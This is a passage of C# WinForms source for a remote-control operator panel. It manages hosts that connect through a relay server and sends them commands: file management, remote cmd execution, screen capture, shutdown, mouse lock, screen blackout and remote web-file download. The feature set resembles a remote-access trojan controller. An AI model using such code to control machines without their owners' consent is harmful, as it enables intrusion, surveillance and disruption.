            else if (e.PacketType == ePacketType.PACKET_CHANGE_RESOLUTION_RESPONSE)
            {
                var resp = e.Obj as ResponseChangeResolution;
                if (resp != null)
                {
                    if (resp.Result)
                    {
                        doOutput(string.Format("分辨率修改成功: {0}x{1} -> {2}x{3}",
                            resp.PreviousWidth, resp.PreviousHeight, resp.CurrentWidth, resp.CurrentHeight));
                    }
                    else
                    {
                        doOutput("分辨率修改失败: " + resp.Message);
                    }
                }
            }
        }

        private System.IO.FileStream downloadFileStream;
        private long recvSize = 0;
        private ResponseStartDownloadHeader DownloadHeader;
        private FrmDownload DownloadWindow;
        private Action<long> UpdateDownloadProgressAction;

        void oRemoteControlServer_ClientDisconnected(object sender, ClientConnectedEventArgs e)
        {
            RemoveClient(e.Client);
        }

        void oRemoteControlServer_ClientConnected(object sender, ClientConnectedEventArgs e)
        {
            AddClient(e.Client);
        }

        private void UpdateProcessListView(ResponseGetProcesses resp)
        {
            if (resp.Result == false)
                return;

            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ResponseGetProcesses>(UpdateProcessListView), resp);
                return;
            }
            this.listView3.Items.Clear();
            for (int i = 0; i < resp.Processes.Count; i++)
            {
                var property = resp.Processes[i];
                ListViewItem item = new ListViewItem(property.ProcessName);
                item.SubItems.Add(property.PID.ToString());
                item.SubItems.Add(property.User);
                item.SubItems.Add(property.CPURate.ToString());
                item.SubItems.Add(GetFileSizeDesc((long)(property.PrivateMemory)));
                item.SubItems.Add(property.ThreadCount.ToString());
                item.SubItems.Add(property.ExecutablePath);
                item.SubItems.Add(property.FileDescription);
                item.SubItems.Add(property.CommandLine);

                this.listView3.Items.Add(item);
            }
        }

        private void AddClient(SocketSession oClient)
        {
            if (oClient == null)
                return;
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<SocketSession>(AddClient), oClient);
                return;
            }
            TreeNode internetNode = this.InternetTreeNode;
            if (internetNode == null)
                return;
            UpsertOnlineClient(oClient);
            if (SessionMatchesFilter(oClient) && FindClientNode(oClient) == null)
            {
                internetNode.Nodes.Add(CreateClientNode(oClient));
            }
            this.clientCount = this.onlineClientSessions.Count;
            refreshClientCountShow();
            doOutput(GetClientDisplayText(oClient) + " 上线了！");
        }

        private void UpsertOnlineClient(SocketSession client)
        {
            if (client == null || string.IsNullOrEmpty(client.SocketId))
                return;
            for (int i = 0; i < onlineClientSessions.Count; i++)
            {
                if (onlineClientSessions[i].SocketId == client.SocketId)
                {
                    onlineClientSessions[i] = client;
                    return;
                }
            }
            onlineClientSessions.Add(client);
        }

        private TreeNode CreateClientNode(SocketSession client)
        {
            TreeNode treeNode = new TreeNode(GetClientDisplayText(client));
            treeNode.Tag = client;
            string avatarKey = client == null ? null : client.OnlineAvatar;
            if (!string.IsNullOrEmpty(avatarKey) && this.treeView1 != null &&
                this.treeView1.ImageList != null && this.treeView1.ImageList.Images.ContainsKey(avatarKey))
            {
                treeNode.ImageKey = avatarKey;
                treeNode.SelectedImageKey = avatarKey;
            }
            else
            {
                treeNode.ImageKey = "qq";
                treeNode.SelectedImageKey = "qq";
            }
            return treeNode;
        }

        private static string GetClientDisplayText(SocketSession client)
        {
            if (client == null)
                return "未知主机";
            if (!string.IsNullOrEmpty(client.HostName))
                return client.HostName;
            string ip = client.GetSocketIPById();
            if (!string.IsNullOrEmpty(ip))
                return ip;
            if (!string.IsNullOrEmpty(client.SocketId))
                return client.SocketId;
            return "未知主机";
        }

        private bool SessionMatchesFilter(SocketSession session)
        {
            if (string.IsNullOrEmpty(hostFilterKeyword))
                return true;

            string keyword = hostFilterKeyword.ToLower();
            return ContainsIgnoreCase(session.SocketId, keyword) ||
                ContainsIgnoreCase(session.HostName, keyword) ||
                ContainsIgnoreCase(session.GetSocketIPById(), keyword) ||
                ContainsIgnoreCase(session.AppPath, keyword);
        }

        private static bool ContainsIgnoreCase(string value, string lowerKeyword)
        {
            return !string.IsNullOrEmpty(value) && value.ToLower().Contains(lowerKeyword);
        }

        private void RenderClientTree()
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(RenderClientTree));
                return;
            }

            this.InternetTreeNode.Nodes.Clear();
            foreach (SocketSession session in onlineClientSessions)
            {
                if (SessionMatchesFilter(session))
                {
                    this.InternetTreeNode.Nodes.Add(CreateClientNode(session));
                }
            }
            this.clientCount = this.onlineClientSessions.Count;
            refreshClientCountShow();
        }

        private TreeNode FindClientNode(SocketSession oClient)
        {
            if (oClient == null || string.IsNullOrEmpty(oClient.SocketId))
                return null;
            TreeNode internetNode = this.InternetTreeNode;
            if (internetNode == null)
                return null;
            for (int i = internetNode.Nodes.Count - 1; i >= 0; i--)
            {
                TreeNode node = internetNode.Nodes[i];
                SocketSession session = node.Tag as SocketSession;
                if (session != null && session.SocketId == oClient.SocketId)
                {
                    return node;
                }
            }
            return null;
        }

        private void RemoveClient(SocketSession oClient)
        {
            if (oClient == null)
                return;
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<SocketSession>(RemoveClient), oClient);
                return;
            }
            TreeNode internetNode = this.InternetTreeNode;
            if (internetNode == null)
                return;
            for (int i = onlineClientSessions.Count - 1; i >= 0; i--)
            {
                if (onlineClientSessions[i].SocketId == oClient.SocketId)
                {
                    onlineClientSessions.RemoveAt(i);
                }
            }
            for (int i = internetNode.Nodes.Count - 1; i >= 0; i--)
            {
                TreeNode node = internetNode.Nodes[i];
                SocketSession session = node.Tag as SocketSession;
                if (session != null && session.SocketId == oClient.SocketId)
                {
                    internetNode.Nodes.RemoveAt(i);
                }
            }
            this.currentSession = null;
            UpdateSelectedClientInfo(null);
            this.clientCount = this.onlineClientSessions.Count;
            refreshClientCountShow();
            doOutput((oClient.HostName ?? oClient.SocketId) + " 下线了！");
        }

        private void actChangeSkin(string sSkinFile)
        {
            try
            {
                if (string.IsNullOrEmpty(sSkinFile) || !System.IO.File.Exists(sSkinFile))
                    return;

                this.skinEngine1.SkinFile = sSkinFile;
                Settings.CurrentSettings.SkinPath = sSkinFile;
                if (this.ToolStripMenuItemSkins != null)
                {
                    UpdateSkinMenuChecked(this.ToolStripMenuItemSkins.DropDownItems, Settings.CurrentSettings.SkinPath);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("actChangeSkin Error: " + ex.Message);
            }
        }

        private bool UpdateSkinMenuChecked(ToolStripItemCollection items, string skinPath)
        {
            bool hasCheckedChild = false;
            if (items == null)
                return false;

            for (int j = 0; j < items.Count; j++)
            {
                var item = items[j] as ToolStripMenuItem;
                if (item == null)
                    continue;

                bool itemChecked = item.Tag != null && item.Tag.ToString() == skinPath;
                bool childChecked = false;
                if (item.DropDownItems.Count > 0)
                {
                    childChecked = UpdateSkinMenuChecked(item.DropDownItems, skinPath);
                }
                item.Checked = itemChecked || childChecked;
                hasCheckedChild = hasCheckedChild || item.Checked;
            }

            return hasCheckedChild;
        }

        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            ToolStripButton tsButton = sender as ToolStripButton;
            tsButton.Checked = !tsButton.Checked;
            if (tsButton.Checked)
            {
                string relayIP = Settings.CurrentSettings.RelayServerIP;
                int relayPort = Settings.CurrentSettings.RelayServerPort;
                if (string.IsNullOrEmpty(relayIP))
                {
                    doOutput("请先在设置中配置Relay服务器地址!");
                    tsButton.Checked = false;
                    return;
                }
                try
                {
                    RSCApplication.oRemoteControlServer.Start(relayIP, relayPort);
                    this.Text = APP_TITLE;
                    SetRelayStatus(true);
                    doOutput("已连接中转服务器");
                }
                catch (Exception ex)
                {
                    Logger.Debug("连接Relay服务器失败: " + ex);
                    SetRelayStatus(false);
                    doOutput("连接Relay服务器失败，请检查配置");
                    tsButton.Checked = false;
                }
            }
            else
            {
                RSCApplication.oRemoteControlServer.Stop();
                this.Text = APP_TITLE;
                SetRelayStatus(false);
                doOutput("已断开中转服务器连接！");
                this.clientCount = 0;
                refreshClientCountShow();
            }
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            SocketSession session = e.Node.Tag as SocketSession;
            if (session != null)
            {
                this.currentSession = session;
                UpdateSelectedClientInfo(session);
                var mousePos = Control.MousePosition;
                var tv = sender as TreeView;
                var loc = tv.PointToClient(mousePos);
                loc.Offset(10, 0);
                this.toolTip1.Show(session.HostName, tv, loc, 2000);

                // 通知Relay服务器绑定到此客户端
                RSCApplication.oRemoteControlServer.SelectClient(session.SocketId);
            }
        }

        private void treeView1_MouseHover(object sender, EventArgs e)
        {
            //var mousePos = Control.MousePosition;
            //var tv = sender as TreeView;
            //var loc = tv.PointToClient(mousePos);

            //TreeViewHitTestInfo hitTestInfo = tv.HitTest(loc);
            //if (hitTestInfo != null && hitTestInfo.Node != null)
            //{
            //    SocketSession session = hitTestInfo.Node.Tag as SocketSession;
            //    if (session != null)
            //    {
            //        loc.Offset(5, 0);
            //        this.toolTip1.Show(string.Format("{0},{1}", session.SocketId, session.HostName), tv, loc, 2000);
            //    }
            //}
        }

        private void treeView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            TreeViewHitTestInfo hitTestInfo = this.treeView1.HitTest(e.Location);
            if (hitTestInfo != null && hitTestInfo.Node != null)
            {
                SocketSession session = hitTestInfo.Node.Tag as SocketSession;
                if (session != null)
                {
                    if (session != this.currentSession) // 与当前会话不同
                    {
                        if (this.currentSession != null) // 当前会话非空，判断是否切换
                        {
                            if (MsgBox.Question("是否要切换当前连接?", MessageBoxButtons.YesNo) != System.Windows.Forms.DialogResult.Yes)
                            {
                                return;
                            }
                        }
                        this.currentSession = session;
                        UpdateSelectedClientInfo(session);
                    }
                    RequestDriveList(session);
                }
                else
                {
                    UpdateSelectedClientInfo(null);
                }
            }
        }

        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            ListViewHitTestInfo hitTestInfo = this.listView1.HitTest(e.Location);
            if (hitTestInfo != null && hitTestInfo.Item != null)
            {
                ListViewItemFileOrDirTag tag = hitTestInfo.Item.Tag as ListViewItemFileOrDirTag;
                if (!tag.IsFile)
                {
                    if (this.currentSession != null)
                    {
                        this.listView1.Tag = tag.Path;
                        RequestGetSubFilesOrDirs req = new RequestGetSubFilesOrDirs();
                        req.parentDir = tag.Path;
                        this.currentSession.Send(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, req);
                    }
                }
            }
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            if (this.listView1.Tag != null)
            {
                string dir = this.listView1.Tag as string;
                if (this.currentSession != null)
                {
                    DirectoryInfo parentDirInfo = System.IO.Directory.GetParent(dir);
                    if (parentDirInfo != null)
                    {
                        string parent = parentDirInfo.FullName;
                        RequestGetSubFilesOrDirs req = new RequestGetSubFilesOrDirs();
                        req.parentDir = parent;
                        this.currentSession.Send(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, req);
                        this.listView1.Tag = parent;
                    }
                    else
                    {
                        RequestDriveList(this.currentSession);
                    }
                }
            }
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
            {
                MsgBox.Info("请先选择客户端！");
                return;
            }
            var frm = new FrmCaptureScreen(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionScreenHandlers.ContainsKey(sessionId))
            {
                this.sessionScreenHandlers.Add(sessionId, frm.HandleScreen);
            }
            else
            {
                this.sessionScreenHandlers[sessionId] = frm.HandleScreen;
            }
            frm.Show();

            RequestStartGetScreen req = new RequestStartGetScreen();
            req.fps = 5;
            this.currentSession.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, req);
        }

        private void UpdateUI(Action action)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<Action>(UpdateUI), action);
                return;
            }
            action();
        }

        private void doOutput(string sMsg)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<string>(doOutput), sMsg);
                return;
            }
            this.richTextBox1.Text = DateTime.Now.ToString("yyyy/mm/dd HH:mm:ss") + " " + sMsg + "\r\n" + this.richTextBox1.Text;
        }

        private void refreshClientCountShow()
        {
            if (!string.IsNullOrEmpty(hostFilterKeyword) && this.InternetTreeNode != null)
            {
                this.toolStripStatusLabel1.Text = "自动上线：" + this.clientCount + "台  筛选：" + this.InternetTreeNode.Nodes.Count + "台";
                return;
            }

            this.toolStripStatusLabel1.Text = "自动上线：" + this.clientCount + "台";
        }

        /// <summary>
        /// 新建文本文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton10_Click(object sender, EventArgs e)
        {
            if (this.listView1.Tag == null)
            {
                MessageBox.Show("无法在该目录下创建文件!");
                return;
            }
            var frm = new FrmInputFileOrDir();
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.Cancel)
                return;
            if (this.currentSession != null)
            {
                RequestCreateFileOrDir req = new RequestCreateFileOrDir();
                req.PathType = Protocals.ePathType.File;
                req.Path = System.IO.Path.Combine(this.listView1.Tag.ToString(), frm.InputText);
                this.currentSession.Send(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, req);
            }
        }

        /// <summary>
        /// 新建文件夹
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton11_Click(object sender, EventArgs e)
        {
            if (this.listView1.Tag == null)
            {
                MessageBox.Show("无法在该目录下创建文件!");
                return;
            }
            var frm = new FrmInputFileOrDir();
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.Cancel)
                return;
            if (this.currentSession != null)
            {
                RequestCreateFileOrDir req = new RequestCreateFileOrDir();
                req.PathType = Protocals.ePathType.Directory;
                req.Path = System.IO.Path.Combine(this.listView1.Tag.ToString(), frm.InputText);
                this.currentSession.Send(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, req);
            }
        }

        /// <summary>
        /// 删除文件或文件件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton9_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            if (MessageBox.Show("确定要删除选择项?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Cancel)
                return;

            if (this.currentSession != null)
            {
                ListViewItem selectedItem = this.listView1.SelectedItems[0];
                ListViewItemFileOrDirTag tag = selectedItem.Tag as ListViewItemFileOrDirTag;

                RequestDeleteFileOrDir req = new RequestDeleteFileOrDir();
                req.PathType = tag.IsFile ? Protocals.ePathType.File : Protocals.ePathType.Directory;
                req.Path = tag.Path;
                this.currentSession.Send(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, req);
            }
        }

        /// <summary>
        /// 上传文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton13_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
                return;

            string remoteFileDir = this.listView1.Tag as string;
            if (remoteFileDir == null)
            {
                MsgBox.Info("当前目录无法上传文件!");
                return;
            }

            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            if (ofd.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                return;

            string localFilePath = ofd.FileName;
            StartUploadFile(this.currentSession, localFilePath, remoteFileDir);
        }

        private void StartUploadFile(SocketSession session, string localFilePath, string remoteFileDir)
        {
            if (session == null)
                return;
            if (string.IsNullOrEmpty(localFilePath) || !File.Exists(localFilePath))
            {
                MsgBox.Info("本地文件不存在！");
                return;
            }
            if (string.IsNullOrEmpty(remoteFileDir))
            {
                MsgBox.Info("当前目录无法上传文件!");
                return;
            }

            if (remoteFileDir.EndsWith("\\"))
                remoteFileDir = remoteFileDir.TrimEnd('\\');
            string remoteFilePath = remoteFileDir + "\\" + System.IO.Path.GetFileName(localFilePath);
            RequestStartUploadHeader req = new RequestStartUploadHeader();
            req.From = localFilePath;
            req.To = remoteFilePath;
            string fileId = Guid.NewGuid().ToString();
            req.Id = fileId;
            session.Send(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, req);

            FileStream fs = new FileStream(localFilePath, FileMode.Open, FileAccess.Read);
            uploadDic.Add(fileId, fs);
            long fileSize = fs.Length;

            var frm = new FrmDownload(() =>
                {
                    RequestStopUpload reqStop = new RequestStopUpload();
                    reqStop.Id = fileId;
                    session.Send(ePacketType.PACKET_STOP_UPLOAD_REQUEST, reqStop);
                }, localFilePath, remoteFilePath, fileSize);
            uploadFrmDic.Add(fileId, frm);
            frm.Text = "上传文件";

            new Thread(() =>
            {
                frm.ShowDialog();
            }) { IsBackground = true }.Start();

            new Thread(() => { DoUploadFileInternal(session, fileId); }) { IsBackground = true }.Start();
        }

        private Dictionary<string, FileStream> uploadDic = new Dictionary<string, FileStream>();
        private Dictionary<string, FrmDownload> uploadFrmDic = new Dictionary<string, FrmDownload>();
        private void DoUploadFileInternal(SocketSession session, string fileId)
        {
            if (uploadDic.ContainsKey(fileId))
            {
                FileStream fs = uploadDic[fileId];
                FrmDownload frm = uploadFrmDic[fileId]; 
                if (fs != null)
                {
                    byte[] buffer = new byte[2048];
                    int totalSize = 0;
                    while (true)
                    {
                        int size = fs.Read(buffer, 0, buffer.Length);
                        if (size < 1)
                            break;

                        if (!uploadDic.ContainsKey(fileId))
                        {
                            break;
                        }
                        byte[] data = new byte[size];
                        for (int i = 0; i < size; i++)
                        {
                            data[i] = buffer[i];
                        }
                        ResponseStartUpload resp = new ResponseStartUpload();
                        resp.Id = fileId;
                        resp.Data = data;

                        session.Send(ePacketType.PACKET_START_UPLOAD_RESPONSE, resp);

                        totalSize += size;
                        frm.UpdateProgress(totalSize);
                    }

                    RequestStopUpload reqStop = new RequestStopUpload();
                    reqStop.Id = fileId;
                    session.Send(ePacketType.PACKET_STOP_UPLOAD_REQUEST, reqStop);
                    uploadDic.Remove(fileId);
                    uploadFrmDic.Remove(fileId);

                    fs.Close();
                    fs.Dispose();
                    fs = null;

                    MsgBox.Info("上传完成!");
                    RefreshCurrentFileView();
                }
                if (frm != null)
                {
                    frm.Close();
                    frm.Dispose();
                    frm = null;
                }
            }
        }

        /// <summary>
        /// 下载文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton14_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            if (this.currentSession != null)
            {
                ListViewItem selectedItem = this.listView1.SelectedItems[0];
                ListViewItemFileOrDirTag tag = selectedItem.Tag as ListViewItemFileOrDirTag;
                if (tag.IsFile == false)
                {
                    MessageBox.Show("暂时不支持文件夹下载！");
                    return;
                }

                string fileName = System.IO.Path.GetFileName(tag.Path);
                var sfd = new SaveFileDialog();
                sfd.FileName = fileName;
                if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.Cancel)
                    return;

                var req = new RequestStartDownload();
                req.Path = tag.Path;
                req.SavePath = sfd.FileName;
                this.currentSession.Send(ePacketType.PACKET_START_DOWNLOAD_REQUEST, req);
            }
        }

        /// <summary>
        /// 发送cmd命令
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonSendCommand_Click(object sender, EventArgs e)
        {
            RequestCommand req = new RequestCommand();
            req.Command = this.textBoxCommandRequest.Text;

            PostRequstWithCurrentSession(ePacketType.PACKET_COMMAND_REQUEST, req);

            this.textBoxCommandRequest.Clear();
        }

        /// <summary>
        /// 回车发送命令
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxCommandRequest_KeyUp(object sender, KeyEventArgs e)
        {
            bool sendCommand = false;
            if (this.sendCommandHotKey == SendCommandHotKey.Enter)
            {
                if (!e.Control && e.KeyCode == Keys.Enter)
                {
                    sendCommand = true;
                }
            }
            else if (this.sendCommandHotKey == SendCommandHotKey.CtrlEnter)
            {
                if (e.Control && e.KeyCode == Keys.Enter)
                {
                    sendCommand = true;
                }
            }

            if (sendCommand)
            {
                buttonSendCommand_Click(null, null);
                e.Handled = true;
            }
        }

        /// <summary>
        /// 对当前会话发送数据包
        /// </summary>
        /// <param name="packetType"></param>
        /// <param name="reqObj"></param>
        private void PostRequstWithCurrentSession(ePacketType packetType, object reqObj)
        {
            if (this.currentSession == null)
                return;
            this.currentSession.Send(packetType, reqObj);
        }

        /// <summary>
        /// 锁定计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonLockComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.Question("确定要锁定计算机:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_LOCK_REQUEST, null);
        }

        /// <summary>
        /// 重启计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonRebootComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.Question("确定要重启计算机:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_REBOOT_REQUEST, null);
        }

        /// <summary>
        /// 睡眠计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonSleepComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.Question("确定要睡眠计算机:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_SLEEP_REQUEST, null);
        }

        /// <summary>
        /// 关闭计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonShutdownComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.Question("确定要关闭计算机:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_SHUTDOWN_REQUEST, null);
        }

        /// <summary>
        /// 休眠计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonHibernateComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.Question("确定要休眠计算机:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_HIBERNATE_REQUEST, null);
        }

        /// <summary>
        /// 选择发送命令模式
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonSelectSendCmdMode_Click(object sender, EventArgs e)
        {
            ContextMenuStrip cms = new ContextMenuStrip();

            ToolStripMenuItem enterMenuItem = new ToolStripMenuItem("Enter 发送", null, (o, args) =>
                {
                    for (int i = 0; i < cms.Items.Count; i++)
                    {
                        var control = cms.Items[i];
                        if (control is ToolStripMenuItem)
                        {
                            (control as ToolStripMenuItem).Checked = false;
                        }
                    }
                    (o as ToolStripMenuItem).Checked = true;
                    this.sendCommandHotKey = SendCommandHotKey.Enter;
                });
            enterMenuItem.Checked = this.sendCommandHotKey == SendCommandHotKey.Enter;
            cms.Items.Add(enterMenuItem);

            ToolStripMenuItem altEnterMenuItem = new ToolStripMenuItem("Ctrl+Enter 发送", null, (o, args) =>
            {
                for (int i = 0; i < cms.Items.Count; i++)
                {
                    var control = cms.Items[i];
                    if (control is ToolStripMenuItem)
                    {
                        (control as ToolStripMenuItem).Checked = false;
                    }
                }
                (o as ToolStripMenuItem).Checked = true;
                this.sendCommandHotKey = SendCommandHotKey.CtrlEnter;
            });
            altEnterMenuItem.Checked = this.sendCommandHotKey == SendCommandHotKey.CtrlEnter;
            cms.Items.Add(altEnterMenuItem);
            Point location = this.buttonSelectSendCmdMode.PointToClient(Control.MousePosition);
            cms.Show(this.buttonSelectSendCmdMode, location);
        }

        /// <summary>
        /// 当前会话是否有效
        /// </summary>
        /// <returns></returns>
        private bool IsCurrentSessionValid()
        {
            if (this.currentSession == null)
            {
                MsgBox.Info("请先选择一台计算机");
                return false;
            }

            return true;
        }

        /// <summary>
        /// 打开网址
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonOpenUrl_Click(object sender, EventArgs e)
        {
            var frm = new FrmInputUrl();
            frm.Owner = this;
            frm.FormClosed += (o, args) =>
                {
                    FrmInputUrl myFrm = o as FrmInputUrl;
                    if (myFrm.InputText == null)
                        return;
                    RequestOpenUrl req = new RequestOpenUrl();
                    req.Url = myFrm.InputText;
                    PostRequstWithCurrentSession(ePacketType.PACKET_OPEN_URL_REQUEST, req);
                };
            frm.Show();
        }

        private void buttonSendMessage_Click(object sender, EventArgs e)
        {
            var frm = new FrmSendMessage();
            frm.Owner = this;
            frm.FormClosing += (o, args) =>
                {
                    var myFrm = o as FrmSendMessage;
                    if (myFrm.Request == null)
                        return;

                    PostRequstWithCurrentSession(ePacketType.PACKET_MESSAGEBOX_REQUEST, myFrm.Request);
                };
            frm.Show();
        }

        private void buttonLockMouse_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmInputUrl();
            frm.Text = "请输入要锁定鼠标的时间（单位：秒）";
            frm.FormClosing += (o, args) =>
                {
                    if (frm.InputText == null)
                        return;
                    int seconds;
                    if (!int.TryParse(frm.InputText, out seconds))
                    {
                        MsgBox.Info("必须输入数字!");
                        return;
                    }
                    RequestLockMouse req = new RequestLockMouse();
                    req.LockSeconds = seconds;
                    PostRequstWithCurrentSession(ePacketType.PACKET_LOCK_MOUSE_REQUEST, req);
                };
            frm.Show();
        }

        private void buttonUnLockMouse_Click(object sender, EventArgs e)
        {
            if (MsgBox.Question("确定要取消锁定鼠标:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_UNLOCK_MOUSE_REQUEST, null);
        }

        private void buttonBlackScreen_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PAKCET_BLACK_SCREEN_REQUEST, null);
        }

        private void buttonUnBlackScreen_Click(object sender, EventArgs e)
        {
            if (MsgBox.Question("确定要取消黑屏:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST, null);
        }

        private void buttonOpenCD_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PACKET_OPEN_CD_REQUEST, null);
        }

        private void buttonCloseCD_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PACKET_CLOSE_CD_REQUEST, null);
        }

        private void buttonPlayMusic_Click(object sender, EventArgs e)
        {
            SendPlayMusicRequestFromPrompt();
        }

        private void SendPlayMusicRequestFromPrompt()
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmInputUrl();
            frm.Text = "请输入音乐文件全路径";
            frm.FormClosing += (o, args) =>
            {
                if (string.IsNullOrWhiteSpace(frm.InputText))
                    return;

                RequestPlayMusic req = new RequestPlayMusic();
                req.MusicFilePath = frm.InputText;
                PostRequstWithCurrentSession(ePacketType.PACKET_PLAY_MUSIC_REQUEST, req);
            };
            frm.Show();
        }

        private void buttonStopPlayMusic_Click(object sender, EventArgs e)
        {
            if (MsgBox.Question("确定要停止播放音乐:" + this.currentSession.SocketId, MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST, null);
        }

        private void buttonRemoteDownloadWebUrl_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmDownloadWebFile();
            frm.FormClosing += (o, args) =>
            {
                if (frm.WebUrl == null || frm.DestFilePath==null)
                    return;

                RequestDownloadWebFile req = new RequestDownloadWebFile();
                req.WebFileUrl = frm.WebUrl;
                req.DestinationPath = frm.DestFilePath;
                PostRequstWithCurrentSession(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, req);
            };
            frm.Show();
        }

        private string GetFileSizeDesc(long size)
        {
            string result = string.Empty;

            if (size > 1000 * 1000 * 1000)
            {
                result = (size * 1.0 / 1000 / 1000 / 1000).ToString("0.000") + " GB";
            }
            else if (size > 1000 * 1000)
            {
                result = (size * 1.0 / 1000 / 1000).ToString("0.000") + " MB";
            }
            else if (size > 1000)
            {
                result = (size * 1.0 / 1000).ToString("0.000") + " KB";
            }
            else
            {
                result = size + " byte";
            }

            return result;
        }

        private string GetDriveSizeDesc(long size)
        {
            if (size <= 0)
                return string.Empty;

            return GetFileSizeDesc(size);
        }

        private void SetFileListColumnsForFiles()
        {
            this.columnHeader2.Text = "大小(KB)";
            this.columnHeader3.Text = "修改日期";
            this.columnHeader7.Text = "类型";
        }

        private void SetFileListColumnsForDrives()
        {
            this.columnHeader2.Text = "类型";
            this.columnHeader3.Text = "总大小";
            this.columnHeader7.Text = "可用空间";
        }

        private void RequestDriveList(SocketSession session)
        {
            if (session == null)
                return;

            session.Send(ePacketType.PACKET_GET_DRIVES_EX_REQUEST, null);
        }

        private void RefreshCurrentFileView()
        {
            if (this.currentSession == null)
                return;

            string currentDir = this.listView1.Tag as string;
            if (string.IsNullOrEmpty(currentDir))
            {
                RequestDriveList(this.currentSession);
                return;
            }

            RequestGetSubFilesOrDirs req = new RequestGetSubFilesOrDirs();
            req.parentDir = currentDir;
            this.currentSession.Send(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, req);
        }

        #region 文件管理右键菜单

        private void initFileManagerContextMenu()
        {
            this.contextMenuStrip1.Items.Clear();
